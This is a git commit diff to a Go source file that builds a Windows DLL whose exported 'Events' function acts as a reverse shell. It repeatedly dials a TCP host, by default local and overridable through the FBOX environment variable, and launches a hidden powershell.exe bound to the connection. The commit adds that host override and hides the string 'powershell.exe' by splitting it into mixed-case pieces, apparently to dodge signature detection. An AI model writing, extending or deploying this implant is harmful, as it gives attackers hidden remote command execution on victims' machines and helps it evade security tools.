ffef65ce318ebd7c2016cc923939ef3af23f5c5e
leofigy <angel.fig@yandex.com>
2023-05-27 21:28:33 -0600

    allowing to overwrite host

--- vox/cmd/events/event.go
+++ vox/cmd/events/event.go
@@ -2,35 +2,49 @@ package main
 
 import "C"
 import (
+	"fmt"
 	"log"
 	"net"
+	"os"
 	"os/exec"
+	"strings"
 	"syscall"
 	"time"
 )
 
 const (
+	// localhost
 	host = "127.1:7333"
-	bin  = "powershell.exe"
 )
 
 /* functions to export as a dll */
 
 //export Events
 func Events() {
+	ghost := host
+
+	if os.Getenv("FBOX") != "" {
+		ghost = os.Getenv("FBOX")
+	}
+
 	dialer := net.Dialer{
 		Timeout: 10 * time.Second,
 	}
 	for {
 		time.Sleep(30 * time.Second)
-		conn, err := dialer.Dial("tcp", host)
+		conn, err := dialer.Dial("tcp",
+			ghost,
+		)
 		if err != nil {
 			log.Println(err)
 			log.Println("retrying and sleeping")
 			continue
 		}
 
-		cmd := exec.Command(bin)
+		cmd := exec.Command(strings.ToLower(
+			fmt.Sprintf(
+				"%s%s%s%s", "pO", "wEr", "She", "LL.exE"),
+		))
 
 		cmd.SysProcAttr = &syscall.SysProcAttr{
 			HideWindow: true,
